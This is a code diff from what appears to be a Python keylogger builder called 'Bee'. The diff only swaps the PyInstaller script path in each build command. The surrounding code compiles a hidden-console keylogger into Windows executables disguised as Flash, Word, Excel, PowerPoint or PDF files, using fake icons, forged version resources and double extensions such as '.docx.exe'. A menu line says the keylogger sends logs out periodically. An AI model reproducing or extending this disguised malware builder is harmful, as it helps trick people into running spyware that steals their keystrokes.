@@ -91,7 +91,7 @@ def main():
                 print '\n {0}This keylogger send logs when logs > 50 chars or each 120 seconds.{1}'.format(BLUE, END)
             if choice.upper() == '6':
                 begin()
-                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconfirm --noconsole -m Manifest/manifest.manifest -F k.py')
+                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --noconfirm --noconsole -m Manifest/manifest.manifest -F k.py')
                 os.system('rm -Rf build k.spec k.py')
                 name = 'Bee.exe'
                 os.rename('dist/k.exe', 'dist/' + name)
@@ -101,7 +101,7 @@ def main():
                 print '\n {0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name
             if choice == '1':
                 begin()
-                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/adobe.Bee -i Icons/flash.ico -F k.py')
+                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --noconsole -m Manifest/manifest.manifest --version-file=Resource/adobe.Bee -i Icons/flash.ico -F k.py')
                 os.system('rm -Rf build k.spec k.py')
                 name = 'Bee_Flash_.exe'
                 os.rename('dist/k.exe', 'dist/' + name)
@@ -110,7 +110,7 @@ def main():
                 print '{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name           
             elif choice == '2':
                 begin()
-                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/word.Bee -i Icons/word.ico -F k.py')
+                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --noconsole -m Manifest/manifest.manifest --version-file=Resource/word.Bee -i Icons/word.ico -F k.py')
                 os.system('rm -Rf build k.spec k.py')
                 name = 'Bee_Word_.docx.exe'
                 os.rename('dist/k.exe', 'dist/' + name)
@@ -119,7 +119,7 @@ def main():
                 print '{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name
             elif choice == '3':
                 begin()
-                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/excel.Bee -i Icons/excel.ico -F k.py')
+                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --noconsole -m Manifest/manifest.manifest --version-file=Resource/excel.Bee -i Icons/excel.ico -F k.py')
                 os.system('rm -Rf build k.spec k.py')
                 name = 'Bee_Excel_.xlsx.exe'
                 os.rename('dist/k.exe', 'dist/' + name)
@@ -128,7 +128,7 @@ def main():
                 print '{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name
             elif choice == '4':
                 begin()
-                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/powerpoint.Bee -i Icons/powerpoint.ico -F k.py')
+                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --noconsole -m Manifest/manifest.manifest --version-file=Resource/powerpoint.Bee -i Icons/powerpoint.ico -F k.py')
                 os.system('rm -Rf build k.spec k.py')
                 name = 'Bee_Power_.pptx.exe'
                 os.rename('dist/k.exe', 'dist/' + name)
@@ -137,7 +137,7 @@ def main():
                 print '{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name
             elif choice == '5':
                 begin()
-                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/acrobat.Bee -i Icons/acrobat.ico -F k.py')
+                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --noconsole -m Manifest/manifest.manifest --version-file=Resource/acrobat.Bee -i Icons/acrobat.ico -F k.py')
                 os.system('rm -Rf build k.spec k.py')
                 name = 'Bee_AcrobatPDF_.pdf.exe'
                 os.rename('dist/k.exe', 'dist/' + name)
